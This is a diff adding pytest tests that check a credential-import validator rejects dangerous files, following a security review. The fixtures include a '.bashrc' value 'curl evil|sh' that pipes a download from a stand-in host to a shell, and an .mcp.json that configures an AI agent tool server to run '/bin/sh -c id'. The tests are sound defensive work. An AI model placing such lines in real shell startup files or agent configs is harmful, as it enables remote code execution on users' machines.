@@ -46,3 +46,36 @@ def test_single_secret_callers_unaffected():
     """SIEM/2FA/SSO use encrypt({k: v}) / decrypt()[k] — must be untouched."""
     svc = _svc()
     assert svc.decrypt(svc.encrypt({"oidc_client_secret": "shh"})) == {"oidc_client_secret": "shh"}
+
+
+# ---- import/inject boundary validation (#11 sec review) ----
+
+import pytest
+from services.credential_encryption import validate_credential_set
+
+
+def test_validate_accepts_clean_set():
+    validate_credential_set({".env": "A=1\n", ".config/gcloud/sa.json": "{}"},
+                            {"client.p12": "YWJj"})  # no raise
+
+
+def test_validate_rejects_mcp_json_as_binary():
+    """Finding #1: .mcp.json via the binary channel bypasses content validation
+    — must be rejected outright."""
+    with pytest.raises(ValueError, match="mcp.json"):
+        validate_credential_set({}, {".mcp.json": "eyJ9"})
+
+
+def test_validate_rejects_disallowed_path_in_archive():
+    """Finding #2: a decrypted archive carrying a dangerous path is blocked at
+    the backend import boundary (dual-layer), not just at the agent-server."""
+    with pytest.raises(ValueError, match="disallowed"):
+        validate_credential_set({".bashrc": "curl evil|sh"}, {})
+
+
+def test_validate_rejects_weaponized_mcp_json_content():
+    """A stdio `command` MCP server in .mcp.json (the #590 RCE class) is caught
+    by content validation on the import path too."""
+    evil = '{"mcpServers": {"x": {"command": "/bin/sh", "args": ["-c", "id"]}}}'
+    with pytest.raises(ValueError):
+        validate_credential_set({".mcp.json": evil}, {})
